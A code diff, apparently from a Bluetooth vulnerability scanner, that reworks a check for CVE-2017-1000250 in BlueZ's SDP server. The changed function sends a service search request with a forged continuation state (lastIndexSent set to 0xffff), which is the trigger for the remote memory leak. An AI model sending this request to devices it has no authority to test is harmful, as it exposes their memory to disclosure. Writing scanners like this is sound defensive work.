@@ -24,8 +24,8 @@ void cont_state_to_char(sdp_cont_state_bluez_t *cont_state, char *dest, uint8_t 
     *len = cont_len;
     uint32_t *timestamp = (uint32_t *) (dest + sizeof(uint8_t));
     *timestamp = htonl(cont_state->timestamp);
-    uint16_t *max_bytes = (uint16_t *) (dest + sizeof(uint8_t) + sizeof(uint32_t));
-    *max_bytes = htons(cont_state->cStateValue.maxBytesSent);
+    uint16_t *last_index = (uint16_t *) (dest + sizeof(uint8_t) + sizeof(uint32_t));
+    *last_index = htons(cont_state->cStateValue.lastIndexSent);
 }
 
 char * create_sdp_svc_attr_search_pdu(uint16_t service, char *continuation, size_t continuation_len)
@@ -112,10 +112,10 @@ int extract_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
 
     uint32_t *timestamp = (uint32_t *) (pdu + offset);
     offset += sizeof(uint32_t);
-    uint16_t *max_bytes_sent = (uint16_t *) (pdu + offset);
+    uint16_t *last_index = (uint16_t *) (pdu + offset);
     
     cont_state->timestamp = ntohl(*timestamp);
-    cont_state->cStateValue.maxBytesSent = ntohs(*max_bytes_sent);
+    cont_state->cStateValue.lastIndexSent = ntohs(*last_index);
 
     return *cont_state_len;
 }
@@ -133,7 +133,7 @@ int is_valid_address(char *address)
 int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
-    int sd, status;
+    int sd;
     uint8_t continuation_len = 0;
     int16_t mtu = MTU;
     char *pdu, cont_state_s[9], buf[MTU] = { 0 };
@@ -143,8 +143,8 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
         return -1;
     // Reduce the size of the incoming and outgoing MTU to force the use of a continuation state
-    if ((status = set_l2cap_mtu(sd, mtu)) < 0)
-        return -2;
+    if (set_l2cap_mtu(sd, mtu) < 0)
+        return CVE_CHECK_ERR;
 
     addr.l2_bdaddr = *target;
     addr.l2_family = AF_BLUETOOTH;
@@ -153,32 +153,36 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, 0x00, continuation_len);
 
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
-        return -3;
+        return CVE_CHECK_ERR;
     // Send initial PDU
     if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t)) < 0)
-        return -4;
+        return CVE_CHECK_ERR;
     // Wait for fragmented response
-    if ((status = read(sd, buf, MTU)) < 0)
-        return -5;
-    
+    if (read(sd, buf, MTU) < 0)
+        return CVE_CHECK_ERR;
+    // Extract continuation state
     if ((continuation_len = extract_cont_state_from_sdp(&cont_state, buf)) < 0)
-        return -6;
+        return CVE_CHECK_ERR;
 
-    // Increase maximum number of bytes the server will send
-    cont_state.cStateValue.maxBytesSent = 0xffff;
+    // Alter the last index of bytes the server sent
+    cont_state.cStateValue.lastIndexSent = 0xffff;
 
     cont_state_to_char(&cont_state, cont_state_s, continuation_len);
 
+    // Free previous PDU
+    free(pdu);
+    // Create same request with modified continuation state
     pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, cont_state_s, continuation_len);
+
     if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t) + sizeof(uint8_t) + continuation_len) < 0)
-        return -7;
+        return CVE_CHECK_ERR;
     
-    if ((status = read(sd, buf, MTU)) < 0)
-        return -5;
+    if (read(sd, buf, MTU) < 0)
+        return CVE_CHECK_ERR;
 
     free(pdu);
     close(sd);
-    return status;
+    return 0;
 }
 
 int open_bluetooth_device(const int device_id)
